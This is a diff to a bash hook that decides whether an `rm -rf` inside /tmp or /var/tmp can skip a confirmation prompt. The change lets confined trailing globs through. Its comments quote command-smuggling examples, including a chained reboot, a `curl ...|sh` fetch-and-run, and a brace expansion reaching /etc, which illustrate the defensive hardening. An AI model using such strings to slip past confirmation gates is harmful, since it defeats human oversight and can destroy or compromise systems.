@@ -104,17 +104,24 @@ rm_rf_segments() {
 }
 
 # True iff the command is a SIMPLE, single rm whose every dangerous-looking
-# target is a concrete literal subpath under a SYSTEM temp root (/tmp or
-# /var/tmp) — scoped scratch cleanup that cannot leak outside those roots. Used
-# only to suppress the ask tier.
+# target is a scoped subpath under a SYSTEM temp root (/tmp or /var/tmp) —
+# scratch cleanup that cannot leak outside those roots. Used only to suppress
+# the ask tier.
+#
+# A trailing glob IS permitted, but ONLY after a LITERAL first path segment
+# (e.g. /tmp/claude-1234/scratch/* , /tmp/x/*.tmp): shell globbing cannot escape
+# the named subtree (no `..`, no absolute pattern), so the blast radius stays
+# inside it. A bare-root glob (/tmp/* , /var/tmp/*) and a glob on the first
+# segment (/tmp/foo*) are still rejected and prompt — those could match far
+# more than intended. This closes the common `rm -rf <scratch>/*` cleanup form
+# that 7085228 intended to allow but the literal-only charset still prompted on.
 #
 # Hardened against confirmation-prompt bypass — a token that looks like a temp
 # path to us but chains/expands to a non-temp action at shell runtime, e.g.
 # `rm -rf /tmp/x;reboot`, `rm -rf /tmp/x && curl e|sh`, or brace expansion
 # `rm -rf /tmp/{x,/etc}`. It refuses to suppress the prompt whenever the command
 # contains ANY shell control operator, expansion, brace, backslash, newline,
-# $HOME/~ reference, or `..`; and each target must match a strict,
-# metacharacter-free charset (no globs).
+# or $HOME/~/.. reference.
 #
 # The temp roots are ANCHORED at the start of the token (^/tmp/ , ^/var/tmp/),
 # so a project-relative path like a Symfony app's `var/tmp` (absolute form
@@ -122,6 +129,8 @@ rm_rf_segments() {
 # Bare roots and dot-only leaves (/tmp/. , /var/tmp/..) are rejected.
 safe_tmp_only() {
     # Shell metacharacters / chaining / expansion / braces → can't reason → ask.
+    # NOTE: '*' and '?' are deliberately NOT in META — a confined glob is allowed
+    # by the token regex below; bracket globs ([...]) fall out via the charset.
     local META='[{}$;&|()<>`]'
     [[ "$COMMAND" =~ $META ]] && return 1
     [[ "$COMMAND" == *'\'* ]] && return 1     # backslash
@@ -134,8 +143,10 @@ safe_tmp_only() {
     [[ -z "$tokens" ]] && return 1
     while IFS= read -r tok; do
         [[ -z "$tok" ]] && continue
-        # Strict: a system temp root + one or more safe path chars, no glob.
-        [[ "$tok" =~ ^(/tmp|/var/tmp)/[A-Za-z0-9._/-]+$ ]] || return 1
+        # A system temp root, a LITERAL first segment (no glob — blocks /tmp/*),
+        # then any number of further segments that MAY carry a * or ? glob
+        # (confined to the named subtree). Optional single trailing slash.
+        [[ "$tok" =~ ^(/tmp|/var/tmp)/[A-Za-z0-9._-]+(/[A-Za-z0-9._*?-]+)*/?$ ]] || return 1
         # Reject dot-only leaf (…/. , …/.. , …/./) — resolves to the root itself.
         [[ "$tok" =~ ^(/tmp|/var/tmp)/[.]+/?$ ]] && return 1
     done <<< "$tokens"
